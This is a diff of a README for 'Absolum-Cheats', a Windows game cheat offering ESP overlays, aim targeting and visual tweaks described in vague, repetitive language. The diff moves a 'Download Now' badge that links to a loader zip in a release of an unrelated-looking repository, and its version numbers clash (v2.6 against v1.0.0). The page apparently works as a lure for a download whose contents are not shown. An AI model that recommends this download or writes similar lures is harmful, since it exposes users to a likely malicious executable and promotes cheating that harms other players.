@@ -1,160 +1,113 @@
-# 🎮 Absolum Cheats Cheats
+🎮 Absolum-Cheats
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
-
-Latest Version: v1.0.0 • File Size: ~156 MB
-
-
-> ⚡ Advanced Game Modification Project for Absolum Cheats
+«⚡ A universal project with additional gameplay and visual features»
 
 Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
 
-!Version
-!Status
-!Platform
-!GitHub
+📖 About
 
----
+Absolum-Cheats is a third-party project featuring a set of additional tools for customizing the game interface, displaying information, and adjusting various parameters.
 
-## 📖 About
+The main focus is on a convenient menu structure, flexible settings, and the ability to enable only the features you need.
 
-Absolum Cheats Cheats is a feature-rich third-party modification project designed to provide a wide range of visual, informational, and gameplay-related customization options for Absolum Cheats.
+«🛠️ A simple interface, flexible configuration, and separate settings for different categories.»
 
-The project focuses on a clean and modern interface, flexible configuration, and an organized menu system that makes available modules easy to configure.
+✨ Features
 
-> 🛠️ Designed with customization, usability, and a modular structure in mind.
+👁️ Information
 
----
+- Player Information
+- Health Display
+- Distance Indicators
+- Name Display
+- Object Information
+- Additional Details
+- Customizable display elements
+- Separate parameters for different components
 
-## ✨ Features
+🎯 Targeting
 
-### 👁️ ESP / Information
+- Target selection area customization
+- Selection of suitable targets
+- Distance settings
+- Sensitivity adjustment
+- Multiple operating modes
+- Individual hotkeys
+- Flexible parameter configuration
 
-Absolum Cheats Cheats includes an extensive information and visualization system with multiple configurable elements.
+👀 Visuals
 
-- 👤 Player ESP
-- ❤️ Health Indicators
-- 📏 Distance Display
-- 🏷️ Player Names
-- 🔲 Configurable ESP Elements
-- 🎨 Custom Visual Settings
-- 📍 Object Information
-- 🔎 Additional Information
-- ⚙️ Individual Visualization Settings
+- Additional visual elements
+- Color customization
+- Distance information
+- Health display
+- Player names
+- Visibility settings
+- Interface appearance customization
 
----
+🔫 Weapon
 
-### 🎯 Aim System
+- Weapon information
+- Main characteristics
+- Additional indicators
+- Customizable display
+- Separate element settings
 
-The aim module provides configurable targeting options and personalization settings.
+🧍 Player
 
-- 🎯 Configurable Aim Area
-- 👤 Target Selection
-- 📏 Distance Settings
-- ⚙️ Targeting Parameters
-- 🎚️ Adjustable Smoothing
-- 🔄 Multiple Operating Modes
-- 🎮 Custom Keybinds
-- 🧩 Flexible Configuration
+- Basic player information
+- Health status
+- Distance
+- Names
+- Visual indicators
+- Additional details
+- Customizable display settings
 
----
+🛠️ Misc
 
-### 👀 Visuals
+- Custom hotkeys
+- Settings saving
+- Multiple profiles
+- Quick feature switching
+- Interface customization
+- Additional parameters
+- Information panels
 
-Customize the way information and additional elements are displayed.
+🎨 UI / Menu
 
-- 🖥️ Advanced Visual Settings
-- 🎨 Custom Colors
-- 📦 Configurable Visual Elements
-- 📏 Distance Indicators
-- ❤️ Health Indicators
-- 🏷️ Name Display
-- 🔎 Additional Information
-- ✨ Custom Interface Appearance
-- 👁️ Visibility Settings
+The menu is organized by categories, making it easy to quickly find and adjust the required settings.
 
----
+- 🗂️ Settings divided into categories
+- 🎨 Appearance customization
+- ⌨️ Hotkey support
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick feature enabling and disabling
+- 📊 Information panels
+- ⚡ Quick access to the main settings
 
-### 🔫 Weapon
+💾 Configuration
 
-Additional weapon-related information and configurable display options.
+Settings can be saved to separate profiles and switched between depending on the selected configuration.
 
-- 🔫 Weapon Information
-- 📊 Weapon Statistics
-- 🎯 Additional Indicators
-- ⚙️ Configurable Information Display
-- 📋 Customizable Weapon Elements
+Available:
 
----
+- 📁 Multiple profiles
+- 💾 Settings saving
+- 📥 Configuration loading
+- 🔄 Quick switching
+- ⚙️ Separate category parameters
+- 📋 Ready-made presets
+- 🗂️ Convenient configuration management
 
-### 🧍 Player
+Example
 
-A dedicated player information module with multiple configurable visualization options.
-
-- 👤 Player Information
-- ❤️ Health Status
-- 📏 Distance
-- 🏷️ Player Names
-- 📍 Visual Indicators
-- 🔎 Additional Information
-- ⚙️ Custom Display Settings
-
----
-
-### 🛠️ Miscellaneous
-
-Additional customization options for the overall experience.
-
-- ⌨️ Custom Hotkeys
-- 💾 Configuration System
-- 📂 Multiple Profiles
-- 🔄 Quick Feature Switching
-- 🖥️ Interface Customization
-- ⚙️ Additional Settings
-- 📊 Information Panels
-- 🎨 Custom UI Options
-
----
-
-## 🎨 UI / Menu
-
-Absolum Cheats Cheats features a clean and organized menu designed around categories and easily accessible settings.
-
-### 🖥️ Interface Features
-
-- 🗂️ Categorized Settings
-- 🎨 Customizable Appearance
-- ⌨️ Hotkey Support
-- 💾 Configuration Saving
-- 📥 Configuration Loading
-- 🔄 Quick Feature Toggles
-- 📊 Information Panels
-- ⚡ Fast Access to Settings
-- 🧩 Modular Layout
-
-The menu is designed to keep configuration simple while providing a wide range of customization options.
-
----
-
-## 💾 Configuration System
-
-The built-in configuration system allows users to save, load, and manage their preferred settings.
-
-### Supported Options
-
-- 📁 Multiple Configuration Profiles
-- 💾 Save Settings
-- 📥 Load Configurations
-- 🔄 Quickly Switch Between Profiles
-- ⚙️ Individual Settings for Each Category
-- 📋 Preset-Based Configuration
-- 🗂️ Organized Configuration Management
-
-### Example Configuration Structure
-
-`text
 configs/
 ├── default.cfg
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
+
+Latest Version: v1.0.0 • File Size: ~156 MB
